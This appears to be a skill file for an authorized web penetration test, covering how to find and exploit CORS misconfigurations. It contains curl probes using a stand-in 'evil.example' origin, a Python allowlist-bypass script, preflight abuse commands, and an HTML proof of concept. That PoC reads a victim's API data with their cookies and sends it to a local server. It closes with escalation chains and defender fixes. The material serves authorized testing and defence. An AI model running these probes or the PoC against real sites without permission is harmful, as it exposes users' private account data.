---
name: cors-misconfig
description: Use when testing cross-origin resource sharing (CORS)
  configuration on an authorized engagement. Covers probing
  Access-Control-Allow-Origin reflection, credentialed CORS with
  Access-Control-Allow-Credentials, null origin trust, wildcard and subdomain
  allowlist bypasses, preflight (OPTIONS) abuse, and building an HTML proof of
  concept that reads cross-origin API responses with a victim's cookies. Use
  when APIs return ACAO headers, when the frontend calls cross-origin APIs,
  or when Burp Suite 2026.2 flags permissive CORS policies on
  session-handling endpoints.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [web-xss, auth-attacks, webapp-pentest-methodology]
tools:
  - name: Burp Suite
    version: "2026.2"
  - name: Python
    version: "3.12"
---

CORS is a browser mechanism that lets a server declare which origins may
read its responses cross-origin. When the configuration is sloppy, any
website the victim visits can read responses that carry the victim's
cookies, which turns a configuration detail into full account compromise.
This skill covers the authorized methodology: probing ACAO behavior with
crafted Origin headers, testing credentialed CORS, bypassing allowlists,
abusing preflight, and proving impact with a working HTML proof of concept.
All testing targets systems you have written permission to test.

## Quick Workflow

1. Map the API surface: every endpoint that returns
   `Access-Control-Allow-Origin`, especially ones handling sessions,
   profile data, or tokens.
2. Send a request with `Origin: https://evil.example` and check whether
   the origin is reflected in the response.
3. Repeat with cookies attached and look for
   `Access-Control-Allow-Credentials: true` next to a reflected origin.
4. Test trust of the `null` origin and of attacker-controlled subdomains.
5. Probe preflight: send OPTIONS with `Access-Control-Request-Method` and
   read which methods and headers the server allows.
6. Build a local HTML proof of concept that fetches a sensitive endpoint
   with credentials and exfiltrates the response.
7. Check caching interactions: a poisoned or cached ACAO response widens
   the impact.
8. Record the exact request, response headers, and PoC result for the
   report.

## 1. Probing Access-Control-Allow-Origin reflection

Start with simple GET requests carrying different Origin values. The
vulnerable pattern is the server echoing back whatever origin it receives.

```bash
# Evil origin probe: look for ACAO: https://evil.example in the reply
curl -si 'https://target.example/api/profile' \
  -H 'Origin: https://evil.example' | grep -i 'access-control'

# Legitimate origin baseline for comparison
curl -si 'https://target.example/api/profile' \
  -H 'Origin: https://target.example' | grep -i 'access-control'

# No Origin header: CORS headers should be absent here
curl -si 'https://target.example/api/profile' | grep -i 'access-control'
```

```bash
# Batch probe many endpoints for reflection with one loop
for p in /api/profile /api/orders /api/tokens /api/settings; do
  echo "== $p =="
  curl -s -o /dev/null -D - "https://target.example$p" \
    -H 'Origin: https://evil.example' | grep -i 'access-control-allow-origin'
done
```

Reflection alone is low impact without credentials. The dangerous
combination is a reflected origin plus
`Access-Control-Allow-Credentials: true`, because then the attacker's
page can read responses made with the victim's cookies.

## 2. Credentialed CORS testing

Repeat the probes with the session cookie attached, exactly as the
victim's browser would send them.

```bash
# Credentialed request from an evil origin
curl -si 'https://target.example/api/profile' \
  -b 'session=YOUR_TEST_SESSION' \
  -H 'Origin: https://evil.example' | grep -i 'access-control'
```

What to look for in the response:

- `Access-Control-Allow-Origin: https://evil.example` (reflected, not `*`)
- `Access-Control-Allow-Credentials: true`

Both together mean a malicious page can run
`fetch(url, {credentials: "include"})` and read the victim's private API
data. Note that `Access-Control-Allow-Origin: *` cannot be combined with
credentials by spec, so a wildcard alone is usually not exploitable for
cookie-based sessions, though it still leaks data for token-less APIs.

## 3. Null origin and subdomain trust

Some servers allowlist the literal string `null`, which browsers send
from sandboxed iframes, and some trust any subdomain of the target.

```bash
# Null origin probe (proxied through Burp or curl)
curl -si 'https://target.example/api/profile' \
  -H 'Origin: null' | grep -i 'access-control'

# Attacker subdomain of the target (register evil.target.example in a lab,
# or simulate with /etc/hosts pointing at your test server)
curl -si 'https://target.example/api/profile' \
  -H 'Origin: https://evil.target.example' | grep -i 'access-control'
```

If `null` is trusted, the PoC uses a sandboxed iframe to generate the
null origin. If subdomains are trusted, any subdomain takeover or any
XSS on any subdomain becomes full CORS bypass, so note the blast radius.

## 4. Allowlist bypass techniques

When the server validates against an allowlist, test the validation
logic itself. These bypasses work against string-prefix, suffix, and
regex checks seen in real applications.

```bash
# Suffix check bypass: endswith("target.example")
curl -si 'https://target.example/api/profile' \
  -H 'Origin: https://target.example.evil.example' | grep -i 'access-control'

# Prefix check bypass: startswith("https://target.example")
curl -si 'https://target.example/api/profile' \
  -H 'Origin: https://target.exampleevil.example' | grep -i 'access-control'

# Dot trick: some parsers treat a trailing dot as the same host
curl -si 'https://target.example/api/profile' \
  -H 'Origin: https://target.example.' | grep -i 'access-control'

# Scheme confusion
curl -si 'https://target.example/api/profile' \
  -H 'Origin: http://target.example' | grep -i 'access-control'
```

A Python loop makes this systematic across a bypass wordlist:

```python
#!/usr/bin/env python3
"""CORS allowlist bypass prober (authorized targets only)."""
import urllib.request

TARGET = "https://target.example/api/profile"
ORIGINS = [
    "https://evil.example",
    "https://target.example.evil.example",
    "https://target.exampleevil.example",
    "https://target.example.",
    "http://target.example",
    "null",
    "https://sub.target.example",
]
for origin in ORIGINS:
    req = urllib.request.Request(TARGET, headers={"Origin": origin})
    with urllib.request.urlopen(req, timeout=10) as r:
        acao = r.headers.get("Access-Control-Allow-Origin")
        acac = r.headers.get("Access-Control-Allow-Credentials")
    print(f"{origin:45} ACAO={acao} ACAC={acac}")
```

## 5. Preflight (OPTIONS) abuse

Browsers send a preflight OPTIONS request before cross-origin calls with
non-simple methods or headers. A permissive preflight lets the attacker's
page use PUT, DELETE, or custom headers cross-origin.

```bash
# Preflight probe: ask whether PUT with a custom header is allowed
curl -si -X OPTIONS 'https://target.example/api/profile' \
  -H 'Origin: https://evil.example' \
  -H 'Access-Control-Request-Method: PUT' \
  -H 'Access-Control-Request-Headers: X-Custom-Token' \
  | grep -i 'access-control'
```

Read the response for:

- `Access-Control-Allow-Methods` listing PUT, DELETE, or PATCH for the
  evil origin.
- `Access-Control-Allow-Headers` echoing the requested custom header.
- `Access-Control-Max-Age` with a large value, which caches the
  permission in the victim's browser and makes the attack reliable.

If preflight allows state-changing methods cross-origin with
credentials, the attacker page can both read and write as the victim.

## 6. Building the proof of concept

Host this page locally during the test (never on a public domain). Open
it in a browser logged in to the target as the test victim.

```html
<!-- cors-poc.html: serve from http://127.0.0.1:8000 -->
<script>
  fetch("https://target.example/api/profile", { credentials: "include" })
    .then(r => r.text())
    .then(data => {
      document.body.innerText = "STOLEN:\n" + data;
      // Exfiltrate to the local test server log
      fetch("http://127.0.0.1:8000/log?d=" + encodeURIComponent(data));
    })
    .catch(e => document.body.innerText = "FAILED: " + e);
</script>
```

```bash
cd /tmp && python3 -m http.server 8000
# Open http://127.0.0.1:8000/cors-poc.html in the victim-test browser
```

Variants for special cases:

- Null origin trusted: wrap the fetch in `<iframe sandbox="allow-scripts"
  srcdoc="...">` so the browser sends `Origin: null`.
- Preflight needed: use `method: "PUT"` and the custom header in the
  fetch so the browser performs the real preflight flow.

A screenshot of the victim's private data rendered on the attacker's
origin is the strongest possible evidence for the report.

## 7. Caching and Vary interactions

Check whether CORS responses are cached, because a cached permissive
response can affect other users, and a missing `Vary: Origin` can leak
one user's CORS grant to another origin.

```bash
# Is the ACAO response cached? Look for Age, X-Cache, or CF-Cache-Status
curl -si 'https://target.example/api/profile' \
  -H 'Origin: https://evil.example' | grep -iE '^(age|x-cache|cf-cache|vary):'

# Two origins, same URL: does the second get the first origin's ACAO?
curl -s -D - -o /dev/null 'https://target.example/api/profile' \
  -H 'Origin: https://evil.example' | grep -i 'access-control-allow-origin'
curl -s -D - -o /dev/null 'https://target.example/api/profile' \
  -H 'Origin: https://other.example' | grep -i 'access-control-allow-origin'
```

If the cache serves the evil origin's ACAO to other origins, or omits
`Vary: Origin` while varying the header per origin, flag it: the cache
layer is amplifying the misconfiguration.

## Edge cases

- The API uses bearer tokens instead of cookies: wildcard ACAO plus a
  token the attacker already has (for example from another leak) still
  matters, but credentialed-CORS theft does not apply.
- `Access-Control-Allow-Origin: *` with `Vary: Origin` absent: fine for
  public data, a finding only if the endpoint returns private data.
- Internal origins allowlisted (intranet hosts, localhost): reachable
  only from the victim's network, so impact depends on the engagement
  scenario; document it rather than dismissing it.
- Mobile apps and non-browser clients ignore CORS entirely: the finding
  is browser-specific, say so in the report.
- The server reflects the origin only on 200 responses but not on
  errors: test both, because error paths sometimes leak stack traces
  worth reading cross-origin.
- Regex allowlists that permit any subdomain: any stored XSS on any
  subdomain, or any subdomain takeover, upgrades this to full bypass.

## Escalation

- Reflected origin without credentials: pivot to endpoints that accept
  tokens in the URL or body, which the attacker's page can supply
  itself, or to preflight abuse for cross-origin writes.
- `null` origin not trusted directly: chain with an open redirect that
  lands on a `data:` URL or sandboxed iframe to manufacture a null
  origin in the victim's browser.
- Subdomain allowlist: hunt that subdomain for XSS or takeover to turn
  a partial trust into full origin control.
- Preflight allows `X-Requested-With` or custom auth headers: the
  attacker's page can now send the exact headers the API expects,
  bypassing naive header-based CSRF defenses.
- Cached ACAO: combine with cache poisoning techniques to serve the
  permissive headers to victims who never made the evil-origin request.

## Detection and defender view

Defenders see CORS abuse as API requests carrying unexpected `Origin`
values that still receive 200 responses with reflected ACAO headers, and
as OPTIONS preflight bursts from origins that were never allowlisted.
Application logs showing private data served to odd origins are the
smoking gun. The durable fixes are an explicit allowlist of trusted
origins (never reflect arbitrary origins), only setting
`Access-Control-Allow-Credentials: true` for origins that truly need
it, keeping preflight allow-methods and allow-headers minimal, and
adding `Vary: Origin` whenever the response varies by origin. A WAF
cannot fix logic-level origin trust, so this is a code configuration
issue.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application): the entry
  point class.
- CWE-942 (Permissive Cross-domain Policy with Untrusted Domains).
- CWE-346 (Origin Validation Error).
- OWASP HTML5 Security Cheat Sheet and CORS guidance: allowlist origins,
  avoid reflecting Origin with credentials.
- PortSwigger Web Security Academy: CORS labs covering reflection,
  null origin, and allowlist bypasses.
- Fetch Standard (https://fetch.spec.whatwg.org/): the normative CORS
  protocol browsers implement.
